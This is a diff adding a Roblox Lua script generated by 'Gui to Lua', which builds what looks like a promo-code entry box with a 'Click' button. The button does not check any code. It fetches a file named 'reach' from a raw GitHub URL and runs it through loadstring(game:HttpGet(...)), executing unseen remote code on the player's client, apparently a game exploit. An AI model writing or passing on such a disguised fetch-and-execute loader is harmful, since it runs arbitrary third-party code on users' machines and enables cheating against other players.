@@ -1,0 +1,48 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local PromoGui = Instance.new("Frame")
+local TextButtonSubmit = Instance.new("TextButton")
+local TextBoxCode = Instance.new("TextBox")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+PromoGui.Name = "PromoGui"
+PromoGui.Parent = ScreenGui
+PromoGui.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+PromoGui.BackgroundTransparency = 1.000
+PromoGui.BorderSizePixel = 0
+PromoGui.Position = UDim2.new(0, 0, 0.802105963, 0)
+PromoGui.Size = UDim2.new(0, 180, 0, 34)
+
+TextButtonSubmit.Name = "TextButtonSubmit"
+TextButtonSubmit.Parent = PromoGui
+TextButtonSubmit.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+TextButtonSubmit.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButtonSubmit.BorderSizePixel = 4
+TextButtonSubmit.Position = UDim2.new(0.624615371, 0, 0, 4)
+TextButtonSubmit.Size = UDim2.new(0.376863509, -4, 1, -8)
+TextButtonSubmit.Text = "Click"
+TextButtonSubmit.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButtonSubmit.TextSize = 18.000
+TextButtonSubmit.TextWrapped = true
+TextButtonSubmit.MouseButton1Down : connect (function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fer12321/fer12321/main/reach"))()
+end)
+
+
+TextBoxCode.Name = "TextBoxCode"
+TextBoxCode.Parent = PromoGui
+TextBoxCode.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+TextBoxCode.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextBoxCode.BorderSizePixel = 4
+TextBoxCode.Position = UDim2.new(0, 4, 0, 4)
+TextBoxCode.Size = UDim2.new(0.639999986, -8, 1, -8)
+TextBoxCode.Text = ""
+TextBoxCode.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBoxCode.TextSize = 24.000
